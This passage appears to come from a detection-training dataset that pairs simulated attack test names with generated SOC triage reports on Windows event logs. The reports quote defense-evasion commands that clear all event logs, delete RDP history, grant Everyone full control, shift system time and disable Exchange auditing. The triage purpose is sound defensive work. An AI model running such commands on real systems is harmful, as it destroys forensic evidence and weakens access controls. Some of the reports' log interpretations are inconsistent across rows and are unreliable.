- **BENIGN:** The application activity concerning Microsoft Edge updates and system processes like `wermgr.exe` for error reporting appears standard.
- **SUSPICIOUS:** The occurrence of the `cmd.exe` command setting `DOTNET_STARTUP_HOOKS` to execute `preloader.dll` is anomalous and could suggest malicious activity or misuse.
- **MALICIOUS/SUSPICIOUS:** Without additional logs from security and system, it's inconclusive but leans towards suspicious given the presence of potential indicators of compromise.

**Resolution:** SUSPICIOUS

**Guidance on Next Steps:**
- Conduct a manual review and audit of the process and command-line history on `Server002`.
- Investigate the origin and content of the `preloader.dll` in the mentioned temp directory.
- Capture network traffic around the time stamps mentioned to detect any outbound/inbound anomalies stemming from this activity.
- Consider scanning the system with a security toolset for anomalies and malware indicators.
- Enhance logging to ensure security and system logs provide additional visibility into user activities and system-level changes.
- Ensure the integrity of installed updates and system software using hashing methods and cross-verifying signatures. 

This thorough investigation will either rule out or confirm the suspicions and guide necessary remediation efforts if malicious activity is confirmed."
Malicious process Masquerading as LSM.exe,"Upon reviewing the provided Windows event logs, there are several elements to consider in determining suspicious or potentially malicious activity:

1. **Security Logs:** 
   - Event ID 5379 relates to credential manager operations. The repeated occurrence of this event indicates attempts to access stored credentials regarding the Microsoft Account of a user defined as ""02txoixylodcstop"". All these operations returned the code 3221226021, which stands for a status indicating that the user attempting the access doesn't have the permission or the operation was not successful. These failed attempts could suggest unauthorized or suspicious access attempts.

2. **Sysmon Logs:**
   - A process creation event for `cmd.exe` shows a command copying the `cmd.exe` to `C:\\lsm.exe` and then executing it with potentially random or suspicious command line arguments (`/c echo data.003`). This behavior is often associated with attempts to persist or execute arbitrary code by masquerading legitimate system executables (`cmd.exe`).
   - The presence of WmiPrvSE.exe and wevtutil.exe might be legitimate in many contexts, but simultaneous execution, especially under a non-regular user (in this case `admin_test`), can be indicators of lateral movement or event log tampering.
   - `whoami.exe` and `hostname.exe` operations appear to be executed in a sequence, often used for reconnaissance purposes to identify the executing user context.

3. **System Logs:**
   - The logs display legitimate and usual system activity surrounding the updating of Microsoft Defender Antivirus definitions. These logs indicate regular system maintenance activities and do not directly correlate to suspicious behavior.

4. **Overall Analysis:**
   - The consistent failed credential read attempts followed by anomaly behavior like unusual copying and execution of system files suggest suspicions.
   - The command execution patterns such as overwriting or using `cmd.exe` in an uncommon manner may pose a risk, pointing towards potential illicit actions either infiltrating or exfiltrating data or setting a foothold.

### Threat Assessment:
- The failed attempts to access Microsoft credential manager, accompanied by the suspicious command execution involving `cmd.exe`, warrant classifying this activity as suspicious. While some activities (like Windows Updates) are benign, the coinciding occurrence of the events mentioned above requires additional scrutiny to assess possible intent or threat actor presence.

### Guidance and Recommended Steps:
- **Further Investigation Required:** Conduct a deep dive into the context and events around these timestamps. Focus on network connections, other user activities, and system changes.
- **Threat Hunt:** Examine other potentially affected systems for similar patterns.
- **Validate Usage:** Verify if any legitimate scripts or scheduled tasks underpin the `cmd.exe` usage. Validate the processes and activities of `admin_test`.
- **Log Review:** Correlate logs from other security systems (such as IDS/IPS, AV alerts) for related warnings or alerts during the timeframe.
- **Mitigation:** Consider temporarily revoking unnecessary access rights from non-critical system accounts and enforce adaptive behavior analytics for real-time detection.

### Final Resolution:
- **SUSPICIOUS:** While not definitively illicit, these logs contain abnormal behavior that needs further investigation to confirm intent or scope."
Flush Shimcache,"### Analysis:

#### Security Log Analysis:
1. **Event ID 4616** - The Security log entries show an adjustment in system time. Such time adjustments can sometimes indicate an attempt to manipulate timestamps for malicious purposes. However, it’s also common for legitimate maintenance tasks such as time synchronization.
2. The subject for these events is `LOCAL SERVICE`, which is a common service account used by Windows for operating system-level functions, including time synchronization.

#### Sysmon Log Analysis:
1. **Frequent Execution of Windows Utilities**:
   - **wevtutil.exe** (Windows Event Utility) and **conhost.exe** (Console Window Host) are invoked multiple times around the same timestamp and executed by `SERVER002\admin_test`.
   - Although this can occur during legitimate administrative tasks, it could also be used for evasive techniques to clear logs or perform other administrative functions potentially in a malignant context.
   
2. **Processes with Rundll32.exe**:
   - A process executes `cmd.exe` with a subsequent call to `Rundll32.exe apphelp.dll,ShimFlushCache`. This command is peculiar, as it uses `Rundll32.exe` which is often used in attacks to load malicious DLLs.
   
3. **Microsoft Edge Update Activity**:
   - A significant amount of activity related to `MicrosoftEdgeUpdate.exe` is observed. This can account for legitimate software updating, but the high frequency and involvement of temporary directories may require investigation to confirm no abuse occurs.

#### System Log Analysis:
- Time synchronization events are showing adjustments to the system time. This aligns with the Security log events for time change, reinforcing that this may have been time synchronization, not malicious activity.

#### Application Log Analysis:
- The Application log also contains entries from `edgeupdate` indicating services stopping. If these align closely to update events in the Sysmon log, this suggests legitimate maintenance actions (e.g., updates) rather than malicious activities.

### Assessment:
1. **BENIGN Indicators**:
   - Time changes associated with legitimate time synchronization services.
   - Frequent updates and related Edge update processes.

2. **SUSPICIOUS Indicators**:
   - Use of `cmd.exe` combined with `Rundll32.exe` calling `ShimFlushCache` is suspicious and warrants further examination to rule out malicious intent.

3. **No Definitive MALICIOUS Indications**:
   - There are no clear signs of malware execution or persistence mechanisms activated based on the logs provided.

### Guidance and Resolution:
- **Resolution**: **SUSPICIOUS**
- **Guidance**: Although the primary activities appear to be related to Windows maintenance and possible legitimate admin actions, the use of `Rundll32.exe` with non-standard parameters should be further investigated.
- **Next Steps**:
  - Perform a manual examination of the file system and check for any unauthorized DLLs that may have been loaded using Rundll32.
  - Validate the `SERVER002\admin_test` account activities to ensure these process executions align with approved administrative tasks.
  - Utilize endpoint detection tools to monitor for any similar or new suspicious activities.

In conclusion, a lot of the activity is normal for a system with active updates and administrator interventions. However, further access for a thorough analysis on the system will help rule out any hidden threats."
Terminal Server Client Connection History Cleared,"In reviewing the provided Windows event logs, there are several elements to consider for suspicious or anomalous behavior:

### Application Log Analysis:
- Entries for the `edgeupdate` service stopping are present. This service stopping is a normal action related to Microsoft Edge updates, though if unexpected, it could warrant further investigation.
- An event from the `Software Protection Platform Service` shows an update or action at `RulesEngine`, which appears normal and related to Windows licensing.

### Sysmon Log Analysis:
- Multiple instances of `powershell.exe`, `wevtutil.exe`, `conhost.exe`, and `cmd.exe` run by the `admin_test` user with a high integrity level. While these tools themselves can be used in benign operations, they are often abused for malicious purposes (e.g., spawning shells, executing scripts, or interacting with the registry).
- Specifically, `cmd.exe` executed with command-line arguments to `reg delete` that modify Terminal Server Client registry keys:
  ```
  ""cmd.exe"" /c reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" /va /f & reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"" /f
  ```
  This operation could potentially be an attempt to remove Remote Desktop connection history, which might be indicative of an effort to hide unauthorized remote access activity.

- The execution of `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` is logged, along with other related `EdgeUpdate` processes executing under `NT AUTHORITY\SYSTEM`. This could be routine updates for Microsoft Edge, but given the overlap in execution with potentially suspicious activities, it deserves scrutiny within the broader context.

### Additional Observations:
- System, Security, and PowerShell logs are absent. Important security-related events may not be documented, which leaves gaps in our analysis. Ensuring these logs are not being suppressed or deleted would be prudent.

### Assessment:
The presence of registry modification commands and overlapping execution of system binaries could suggest suspicious activity, potentially indicative of a compromise attempt or misconfiguration. However, without further contextual information or corroborating evidence from other log sources, labeling the activities as outright malicious is premature.

### Resolution:
**SUSPICIOUS** - The logs contain activities that deviate from typical behavior warranting further investigation, particularly the command-line registry deletions under the `admin_test` account. It is recommended to:
1. Investigate the purpose of the registry modifications and verify if they align with legitimate administrative activity.
2. Verify whether the execution of `powershell.exe` and `cmd.exe` was legitimate or occurs frequently.
3. Enhance monitoring around activities executed by the `admin_test` account.
4. Ensure completeness and availability of System, Security, and PowerShell logs for further review.
5. Conduct a thorough endpoint security assessment on `Server002` to rule out unauthorized access or lateral movement risks."
Running DLL with .init extension and function,"**Analysis of Logs:**

The provided logs include entries from the System log, Windows PowerShell log, Sysmon log, Application log, and Security log. Below are the key observations and analysis for each log category:

**1. Windows PowerShell Logs:**

- **Observed Behavior:**
  - Multiple entries indicate the use of `rundll32.exe` to execute a file located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\_WT.init,krnl`). 
  - The PowerShell host application is initiated by `rundll32.exe`, which is unusual because `rundll32.exe` is typically used for executing DLLs, not usually for hosting PowerShell scripts.

- **Analysis:**
  - The execution of PowerShell through `rundll32.exe` from a temporary file location is suspicious and could be an indicator of malicious activity, such as a Trojan or malicious script execution. This method is often used for obfuscating the origin of PowerShell commands.

**2. Sysmon Logs:**

- **Observed Behavior:**
  - The logs show processes like `powershell.exe` and `wevtutil.exe` executed by the user `SERVER002\admin_test`.
  - The `cmd.exe` was used with a command-line argument calling `rundll32.exe` on the same file found in the PowerShell logs, supporting the potential execution of a malicious script.
  - The frequent use of `conhost.exe` and `wevtutil.exe` without clear legitimate contexts raises some flags. 
  - It’s notable to see `rundll32.exe` activities tied to both `C:\Windows\System32\rundll32.exe` and `C:\Windows\SysWOW64\rundll32.exe`, which could represent further obfuscation by using both 32-bit and 64-bit processes.

- **Analysis:**
  - Similar to PowerShell, the use of `rundll32.exe` pointing to a temporary directory script presents a potential malicious execution vector.
  - The use of `wevtutil.exe` might suggest attempts to manipulate or clear event logs, a common technique used by attackers to cover tracks.

**3. System, Application, and Security Logs:**

- **Observation:**
  - These logs do not present any additional events of concern related to suspicious activities. 
  - Logs include standard system services and updates (e.g., `TiWorker.exe`) and expected activities for `NT AUTHORITY`.

**Overall Assessment:**

The presence of `rundll32.exe` executing a payload from within the `Temp` directory via PowerShell, coupled with associated `cmd.exe` commands and Sysmon activities suggests potentially harmful operations likely indicative of compromise attempts.

**Resolution:**

**MALICIOUS** 

**Guidance on How to Proceed:**

1. Isolate the affected host `Server002` to prevent potential lateral movement and further execution of malicious processes.
2. Conduct a deeper forensic investigation, focusing on the source and contents of the `_WT.init,krnl` script and any related files in the mentioned temporary directory.
3. Review and preserve the logs from the affected systems for further analysis and potentially for evidence collection.
4. Examine network traffic from the affected server around the times of the events to identify communications that may indicate command and control activities.
5. Strengthen monitoring of PowerShell logging, especially focusing on the execution via `rundll32.exe` and any command line analytics to detect similar attempts in the future.
6. Lastly, check if there are additional compromise indicators inside the enterprise to determine if this is part of a larger attack campaign."
Execution from Compressed JScript File,"### Detailed Analysis of Windows Event Logs

#### System Log
1. **Windows Update Events**: The logs indicate several Windows Update operations for Microsoft Defender Antivirus (Event IDs 44, 43, and 19). These events appear to reflect normal system behavior associated with routine update processes, including updates for Microsoft's anti-malware solutions.

#### PowerShell Log
- There is no data available in the Windows PowerShell log for analysis.

#### Sysmon Log
1. **PowerShell and Associated Processes**:
   - The execution of `powershell.exe` by the user `SERVER002\admin_test` (EventID 5) could potentially be suspicious depending on its context. 
   - We observe multiple executions of `conhost.exe`, `wevtutil.exe`, `whoami.exe`, `cmd.exe`, `wscript.exe`, and `calc.exe` by `SERVER002\admin_test`.
   - A noteworthy sequence: `cmd.exe` executes a script located in a Temp directory, which in turn launches `wscript.exe` to run `datajs.js`. This behavior could be indicative of suspicious script execution often leveraged in malicious activities. The same sequence eventually results in a launch of `calc.exe`, which is sometimes used as a test or a distraction in malicious activities to blend in with legitimate processes.

2. **System Integrity Tools**:
   - Processes associated with system updates and integrity (`wuauclt.exe`, `MpSigStub.exe` for definition updates) were executed with typical command-line arguments indicating the completion of updates. These logs appear normal.

3. **Processes with High Privileges**:
   - Several commands are executed with a high integrity level, suggesting they run with elevated privileges. This includes `cmd.exe` executing scripts, which is commonly associated with unauthorized activities.

#### Application Log
- The log reflects standard operations where Windows Defender is reported as operational and actively providing protection (`SECURITY_PRODUCT_STATE_ON`). This is standard behavior and expected in routine operations of the system.

#### Security Log
- Event ID 5379 entries indicate operations related to credential requests. The failure indicated by `ReturnCode: 3221226021` typically implies a failed authorization attempt or access to credentials. While this could be normal depending on context, repeated unsuccessful accesses might warrant further exploration to ensure there isn't an attempted credential compromise.

### Assessment
- **Suspicious Activities Identified**: The use of `cmd.exe` with a command running a `.js` file via `wscript.exe` from a seemingly temporary directory raised a red flag. Scripts executing from temporary directories often indicate the manipulation of files possibly designed to evade detection by running scripts in an unconventional way. Such behavior should be scrutinized closely, especially given that further processes (`calc.exe`) were initiated, which may not be typical of standard admin operations.

### Resolution: SUSPICIOUS
- **Recommendations**:
  1. Conduct a deeper investigation into the script `datajs.js` and its originating source. This includes examining its purpose, origin, and any changes made to the system.
  2. Review any PowerShell or Command Prompt activity executed by `admin_test` further to establish whether this behavior aligns with expected usage patterns.
  3. Ensure endpoint protection solutions are updated and scanned to validate the presence of potential malicious scripts.
  4. Since some of the behavior suggests potential misuse of elevated privileges, ensure all privileged accounts are evaluated for legitimacy and necessity."
Office 365 - Exchange Audit Log Disabled,"Based on a detailed analysis of the provided event logs, several key points of interest have been noted that could indicate suspicious or potentially malicious activity:

1. **Unusual PowerShell Activity:**
   - The command execution observed in the PowerShell logs involves connecting to Exchange Online using a PowerShell script and modify audit log ingestion settings (`Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False`). This kind of activity is unusual and could be indicative of an attacker attempting to disable logging to cover their tracks. The use of `ConvertTo-SecureString -AsPlainText -Force` without specifying credentials could indicate an attempt to perform actions without secure credential management, which is risky and may suggest improper handling or scripted attacks.

2. **SystemUtil.exe Activity:**
   - The frequent execution of `wevtutil.exe` within a short timeframe by the user `admin_test` might indicate an attempt to tamper with or analyze Windows Event Logs. This utility can be used both legitimately and for nefarious purposes (e.g., clearing logs, querying event logs by attackers).

3. **Multiple `conhost.exe` Processes:**
   - Numerous instances of `conhost.exe` associated with processes like `PowerShell` and `whoami` from the admin_test user are logged. While `conhost.exe` is a legitimate Windows process, its use in conjunction with potentially sensitive operations can sometimes suggest an attempt to mask malicious activity or imply interaction with a command-line interface in suspicious contexts.

4. **Security Logs and Privilege Escalations:**
   - The security events show `CompatTelRunner.exe` querying user information, which is normal for Windows telemetry. However, coupled with other activities and the context, this could be worth further examination.
   - Event ID 4672 indicates special privileges were assigned, including the `SeDebugPrivilege`, which could be leveraged for privilege escalation or to debug and examine processes for possible exploitation.

5. **CompTelRunner Activity:**
   - This executable is used for Windows compatibility telemetry. However, in the sequence presented, it queried user accounts and group memberships, which, while potentially benign, in this context could suggest profiling the environment for future actions. This pattern could combine with intentional data exfiltration activities.

**Assessment:**
The observed behavior, particularly the PowerShell command that aims to modify audit log ingestion settings, frequent `wevtutil` usage within a short timeframe, and multiple `conhost` processes, raises concerns indicating potential preparation or execution of a malicious activity. These activities could potentially symbolize lateral movements, privilege escalations, or efforts toward persistence and log tampering, characteristic of compromised environments.

**Resolution:**
- **SUSPICIOUS:** While definitive malicious intent cannot be conclusively confirmed solely based on these logs, the actions observed are atypical for standard operations without proper justification or context. Given the risk factors, this activity warrants further investigation with focused assessments for any anomalies, malware, or unauthorized access within the corporate environment. This will help ensure any potential threats to the security posture of the organization are promptly addressed and mitigated."
Event Log Manipulations- Time slipping via Powershell,"In reviewing the provided logs, I've identified the following key points of interest:

1. **Time Manipulation Detected via PowerShell:**
   - The logs indicate multiple adjustments to the system time using PowerShell (Sysmon Event ID 1 and Security Event ID 4616).
   - The command executed through PowerShell includes `Set-Date -Date (Get-Date).AddDays(3)`, which shifts the date forward by 3 days, and `Add-Content ""$env:APPDATA\\slipDays.bak"" 3`.
   - This activity indicates deliberate time change manipulation, which is frequently observed in attack scenarios, either to bypass certain time-based security controls or to align malicious activity with a backdated timestamp.

2. **Unusual Executions of `wevtutil.exe and conhost.exe`:**
   - Continuous execution of `wevtutil.exe` and `conhost.exe` recorded in Sysmon logs without corresponding legit task identifiers (no clear purpose mentioned in rule names).
   - `wevtutil.exe` is often used to manage Windows event logs and could be used by an attacker to clear logs, while `conhost.exe` might be used to execute commands without a visible command prompt.
   
3. **Suspicious Process Activity:**
   - There is a noted execution of the PowerShell script from within a temporary user profile folder (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`), which is atypical for standard operations and suggests potential malware staging.

4. **Use of System Privileges:**
   - Events recorded with high integrity level processes and granted privileges indicative of potential privilege escalation activities (Security Event ID 4672).
   - The user `admin_test` is repeatedly involved in executing these time manipulation scripts and running processes with elevated permissions. 

Based on the findings:

- **Threat/Risk:** The principal risk involves potential intentional system time manipulation to disguise activity or circumvent time-based defenses, paired with attempts to clear or alter event logs using `wevtutil.exe`.
- **Additional Investigation Required:** Further investigation is required into the source and intent of the time manipulations, as well as the purpose of the `wevtutil.exe` executions. This includes verifying whether these actions were expected administrative tasks or unauthorized activities.
- **Immediate Action:** Restrict the use of PowerShell and `wevtutil.exe` for the user account `admin_test` and audit their activities. Review system and network changes corresponding with the time manipulations for any unauthorized modifications.

**Final Resolution:**
- **SUSPICIOUS** - The logs contain activities which warrant deeper investigation to rule out any unauthorized or malicious intent."
Grant Full Access to folder for Everyone - Ryuk Ransomware Style,"### Detailed Analysis of the Logs

Upon a thorough examination of the provided Windows event logs, a few key observations and potential concerns emerge:

#### 1. **Application Log:**
- **EdgeUpdate Service Stopped:** The logs show the `edgeupdate` service stopped twice within a very short time (less than 2 seconds apart). While this could be normal, it might be worth investigating the frequency and cause of such stops, particularly if this service should be consistently running.

#### 2. **Sysmon Log:**
- **Usage of `wevtutil.exe`:** There are multiple executions of `wevtutil.exe` by the user `SERVER002\admin_test`. This utility is often used for managing Windows event logs, which might be normal for admin activities, or it could indicate log tampering if there is no legitimate reason for such frequent access during the same session.
- **Running `cmd.exe` for Permissions Change:** The execution of `cmd.exe` with the command `icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q` is highly suspicious. This command grants full control permissions to the ""Everyone"" group recursively in the `Public` directory, which could be indicative of an attempt to lower security settings, potentially enabling access to sensitive files or applications.
- **Processes by `admin_test`:** Processes like `cmd.exe`, `whoami.exe`, and others being run by `SERVER002\admin_test` show actions typical of troubleshooting or system administration, but if unexplained, they could suggest user reconnaissance or privilege abuse.

#### 3. **Security Log:**
- **Event ID 4616 (System Time Changed):** The logs show multiple time changes within seconds. This might indicate legitimate time synchronization activities with a time server. However, frequent or significant unexplained time changes can disrupt log timelines, making it harder to track events accurately.

#### 4. **System Log:**
- **Kernel-General Time Change Events:** These are corroborated in the System log, asserting time changes. They align with NTP syncs; however, it requires validation that these are expected adjustments from a known and trusted source.

#### 5. **Observations on EdgeUpdate:**
- The execution details of `MicrosoftEdgeUpdate.exe` and related processes do not show anything explicitly malicious. They align with typical update or installation activity. However, the presence of these tasks as temporary processes should be verified against known operations for Edge software updates.

### Assessment and Resolution

Based on the analysis, several elements stand out:

- The presence of `icacls` for changing permissions is a significant indicator of potential malicious activity. Unless explicitly justified by an operational requirement, this could represent a security risk related to unauthorized access or privilege escalation.
- The consistent use of utilities like `wevtutil.exe` without sufficient context suggests possible log referencing or tampering.
- Although the Microsoft Edge update activities are not explicitly flagged as suspicious, the coincidence of timing with other actions should be cross-referenced with scheduled update activities to rule out disguised actions.

### Conclusion: **SUSPICIOUS**

- **Resolution:** SUSPICIOUS - The logs require deeper investigation. While not overtly aligned with known malicious patterns, certain actions taken in the logs, particularly the permission change using `icacls`, warrant closer scrutiny. Additional context and review of user actions during this period or audit logs and any pattern deviations in administrative routines are recommended to affirm or dismiss the potential threat.
- **Guidance:**
  - Verify the context of the `cmd.exe` permissions change command. Determine if it aligns with any legitimate implementation or script execution.
  - Inspect the configuration management or audit logs for scheduled tasks that could explain Edge update actions and any deviations from standard procedures.
  - Review and possibly correlate time change events with external time servers to ensure authenticity.
  - Evaluate usage of `wevtutil.exe` for any unwarranted access or manipulation attempts."
Activate Windows NoTrayContextMenu Group Policy Feature,"### Detailed Analysis of the Logs:

**1. Process Execution Patterns:**
   - Consistent use of `wevtutil.exe` and `conhost.exe` throughout the Sysmon log entries under the user `SERVER002\admin_test`. These tools are legitimate Windows utilities. However, `wevtutil.exe` is typically used to query event logs and could potentially be used by an attacker to evade detection.
   - The presence of `cmd.exe` executing a command to manipulate the Windows Registry appears suspicious. The command `reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoTrayContextMenu /t REG_DWORD /d 1 /f` would disable right-click context menus in Windows. This behavior might be indicative of an attempt to restrict functionalities or apply unauthorized policies on the user interface, which could be considered potential malicious behavior.

**2. User Context and Integrity Levels:**
   - The processes initiated by `SERVER002\admin_test` are running at a 'High' integrity level, indicating administrative privileges. This user context is crucial for potentially restricting or modifying system behavior, hinting at potential misuse if these actions weren't intentional.

**3. Time Changes:**
   - Occurrences in the System and Security logs showing time adjustments made by `svchost.exe` and associated with `LOCAL SERVICE` are logged. While these might be routine synchronization operations with an NTP server, unauthorized time changes may help hide activities. There is no explicit sign of time tampering aligning with suspicious activities, although this warrants a consideration given the context.

**4. Application/Service Updates:**
   - Several legitimate update processes for Microsoft Edge are visible in the logs. The logs indicate regular behavior related to software updates and the execution of Microsoft Edge Update processes, controlled by `NT AUTHORITY\SYSTEM`. These entries do not signify unauthorized actions or malicious intents.

**Assessment and Evaluation:**
- The running of legitimate system utilities by an administrative user is not inherently suspicious, but the specific registry modification using `cmd.exe` might imply unauthorized attempts to alter user settings, potentially used to restrict user access or camouflage further malicious activity.
- The standard Edge updates and Microsoft Windows system operations do not indicate suspicious or malicious activity.

### Conclusion:
Upon reviewing the various logs, the behavior associated with `cmd.exe` and the registry alteration stands out as an anomaly warranting further examination. There is no immediate evidence of an explicit compromise, but the registry change suggests potential unauthorized modifications.

**Resolution**: **SUSPICIOUS**
- The activation of the Windows Registry with the parameters given in the log could indicate risk. Further investigation is needed to determine the legality or necessity of these changes.
  
### Guidance for Next Steps:
- **Investigate the legitimacy** of the tasks executed by the user `SERVER002\admin_test`—confirm whether these changes were authorized administrative actions.
- **Identify the origin** of the command that altered the registry to assess if this was a legitimate administrative action or if it aligns with external threats or insider threats.
- **Check for additional indicators** of compromise on the host like unknown processes, unusual network activity, or unauthorized access attempts. Conduct a comprehensive assessment of any other systems connected to the same network.
"
Uninstall Crowdstrike Falcon on Windows,"Based on the analysis of the provided logs, here's the breakdown:

### Security Log Analysis
1. **Logon Events (Event ID 4624 and 4672)**: The log entries indicate successful logons using Logon Type 5, which is typically associated with service startup. This matches the usual system logon pattern for a service account (e.g., SYSTEM). The elevated privileges assigned are typical for SYSTEM accounts.
   
2. **Credential Validation (Event ID 5379)**: These events indicate failed credential validations with a return code of `3221226021`, which translates to ""The username or password is incorrect."" It could suggest an unauthorized attempt to access a Microsoft account token but does not confirm any success.

3. **Group Membership Enumeration (Event ID 4798)**: Multiple group enumerations targeting accounts like ""Administrator"" and ""admin_test"" taking place. This is usually benign if done by an authorized admin or process, but could signal reconnaissance if not authorized.

### Application Log Analysis
**Windows Defender and Edge Update Logs**: Windows Defender is active, and there are logs related to typical Edge browser updates. Nothing suspicious was detected in these logs.

### Sysmon Log Analysis
1. **Process Creation (Event ID 1 and 5)**: Various processes including PowerShell, Taskhost, and other System services are being executed. Notable is a PowerShell command (executes CrowdStrike-related uninstall command) that implies a potential uninstall of a CrowdStrike component. Although it could be benign if an admin performed it for valid reasons, it usually is something to look into if not authorized.

### Windows PowerShell Log
The PowerShell logs capture execution of commands possibly for removing or altering installed applications, specifically related to Crowdstrike uninstall commands. This is unusual unless done by an administrator for maintenance or deprovisioning.

### Risk Assessment
- The unsuccessful attempts to access Microsoft accounts might indicate probing but no breach was seen in the logs.
- The invocation of PowerShell with commands indicating the uninstallation of CrowdStrike's Windows Sensor is potentially suspect unless authorized.

### Conclusion
Due to the attempts to verify credentials and the PowerShell activity indicating CrowdStrike component removal, there is activity that seems out of the ordinary. However, without confirmation of unauthorized or malicious access, it can't be conclusively termed as malicious. This requires further investigation to validate the purpose and authorization of the PowerShell commands observed.

Resolution: **SUSPICIOUS** 

### Guidance
1. **Investigate PowerShell Usage**: Check the origins of the PowerShell commands that attempt to uninstall Crowdstrike Windows Sensor and confirm if they were authorized.
2. **Validate Credential Access**: Follow up on the credential validation attempts to ensure that there are no attempts at unauthorized access.
3. **Monitor for Recurrent Patterns**: Keep an eye on repeated or escalated attempts from the same origin or similar patterns in the network for any potential threats."
LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell,"**Detailed Analysis of the Logs:**

1. **System Log:**
   - The system log includes events related to time changes. There are events showing the time was set back and then adjusted forward. These changes were performed by `svchost.exe` running under `LOCAL SERVICE`. Typically, these time adjustments are normal and associated with time synchronization processes such as the Windows Time Service. However, it is unusual to see the time being reverted momentarily and then corrected forward.

2. **Windows PowerShell Log:**
   - The PowerShell logs indicate a command was executed to modify a registry key disabling the OOBE (Out Of Box Experience) privacy experience using `powershell.exe`. The command involved changing a system policy, which might not be typical unless being done as part of an administrative task or script. This needs further exploration to confirm the legitimacy of this action.

3. **Sysmon Log:**
   - There are multiple process creation events regarding `MicrosoftEdgeUpdate.exe`, which is consistent with automatic updates of Microsoft Edge. These processes are executed by `NT AUTHORITY\SYSTEM`, which suggests they are legitimate system processes related to software updates.
   - The logs also show typical utilities being run (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`), primarily by the user `SERVER002\admin_test`. This consistent activity with administrative tools can be characteristic of routine system administration. However, continuous monitoring for unexpected sequences or anomalies in other parts of the system would help ensure this is benign.
   - The registry modification by `powershell.exe` related to the OOBE behavior is observed and merits a closer look.

4. **Application Log:**
   - The `Application` log contains several `Service stopped` events tied to `edgeupdate`. These activities are common during automatic update installations and do not inherently indicate malicious activity.

5. **Security Log:**
   - The security logs document the time setting changes, aligned with the `System` log activities. The context provided in these logs, showing `svchost.exe` as the actor, does not raise immediate red flags without further context or frequency of recurrence.

**Assessment of the Situation:**
- **Unusual Event Identified:**
  - The execution of a PowerShell command to modify the OOBE system policy is seemingly anomalous and not part of routine operations unless explicitly managed by IT policy or automated systems.

- **Threats or Risks Identified:**
  - A potential risk exists around unauthorized or improperly managed registry changes that could alter system behavior.

- **Next Steps:**
  - Verify with system administrators or IT policy managers regarding the legitimacy of the executed PowerShell command.
  - Check for any associated scripts or automated tasks that might have triggered this PowerShell activity.
  - Scrutinize the user account `SERVER002\admin_test` activities for possible misuse or unauthorized access.
  - Monitor for any suspicious follow-up activities, particularly around time changes or unintended modifications to other system policies or settings.

**Resolution:**
After considering all the details and within the current context without known malicious indicators beyond the registry modification, the overall resolution is:

- **SUSPICIOUS** - There is unusual activity in terms of system modifications, which requires further investigation to ascertain legitimacy and rule out malicious intent."
Delete System Logs Using Clear-EventLog,"Upon reviewing the provided Windows event logs, I have identified several points worth mentioning:

### Observations and Analysis

1. **Windows Time Change**: 
   - **Event IDs 4616** from the Security log and **Event IDs 1 and 24** from the System log indicate a time change. Although time changes can happen due to valid reasons (e.g., synchronization with a time server), they can also be used by attackers to alter timestamps and mask malicious activities.

2. **PowerShell Command Execution**:
   - The Sysmon log captures an event where PowerShell is executed with the command `Get-EventLog -List | ForEach-Object {$_.Log}, $logs | ForEach-Object {Clear-EventLog -LogName $_ }`. This command essentially clears event logs, which is suspicious and often seen in attempts to cover tracks after an intrusion or malicious activity.

3. **Process Execution**:
   - There are multiple system32 processes such as `whoami.exe`, `hostname.exe`, and `conhost.exe` executed by the user `admin_test`, noted in the Sysmon log. While these processes are legitimate, their frequent and clustered execution merits attention in the context of potential suspicious activity.

4. **Software Updates**:
   - The logs show various executions of Microsoft Edge update processes. While generally normal, in conjunction with other suspicious activities, it is worth ensuring that updates are legitimate and not being used to mask malicious downloads or installations.

5. **Service Stopped**: 
   - The edge update application log entry indicating ""Service stopped"" could be routine but paired with cleared event logs, it might suggest interference with services to disrupt normal monitoring or operations.

### Assessment and Resolution
Taking into account the clearing of the event logs via PowerShell, along with the observed time change and clustered process execution, there are strong indicators of potential misuse or malicious activities. This activity, especially the clearing of the event logs, is a major red flag.

**Resolution: MALICIOUS**

Given these findings, the logs contain malicious activity.

### Recommendations for Proceeding
- **Immediate containment and investigation**: Disconnect the system from the network to prevent further malicious activity.
- **Forensic Analysis**: Perform a full forensic investigation to identify how the system was compromised and if any backdoors or malicious programs were installed.
- **Review User Activity**: Investigate the actions and behaviors of the user `admin_test`, as their credentials may have been misused.
- **Patch and Update**: Ensure all software and operating systems are up to date to mitigate potential vulnerabilities.
- **Employ Monitoring**: Implement or enhance monitoring to detect similar suspicious activities in the future.
- **Incident Reporting**: Report the incident to your internal security response team for thorough investigation and reporting to necessary authorities if required."
Create an Administratoruser (with a space on the end),"### Analysis of Windows Event Logs

#### Suspicious and Anomalous Behavior:

1. **Time Manipulation:**
   - Security Event ID `4616` and System Event IDs `1`: The `NewTime` is earlier than the `OldTime`, indicating potential time manipulation.This might be an attempt to cover unauthorized actions by altering timestamps.

2. **Unauthorized Account Creation:**
   - A PowerShell command was executed to create a new local user `Administrator ` without a password.
   - Security Event IDs `4720` and `4722` indicate that a user account with the name ""Administrator "" was created and enabled. This action was performed by `admin_test`. 
   - The `New-LocalUser` PowerShell command execution suggests potential unauthorized access or malicious intent.

3. **Group Membership Addition:**
   - Security Event ID `4728`: A SID was added to a group (likely Administrators, given the context). This was performed by `admin_test`, which implies privilege escalation.

4. **Use of Privileged Tools and Processes:**
   - Sysmon log entries show the use of processes like `wevtutil.exe`, `whoami.exe`, `hostname.exe`, and `wsmprovhost.exe`. While benign under normal operations, these can be used for reconnaissance or lateral movement if executed by unauthorized users/accounts.
   - Notably, the `conhost.exe` processes frequently appear related to command line operations, which can be indicative of manual execution often associated with malicious activities.

5. **Microsoft Edge Update Process Chains:**
   - There are multiple executions involving `MicrosoftEdgeUpdate.exe` and related components. Such activity is expected in the context of legitimate update processes, but the high volume and variety within a short time frame could be a disguise for some malicious behavior (although unclear from current logs).

### Assessment of the Situation:

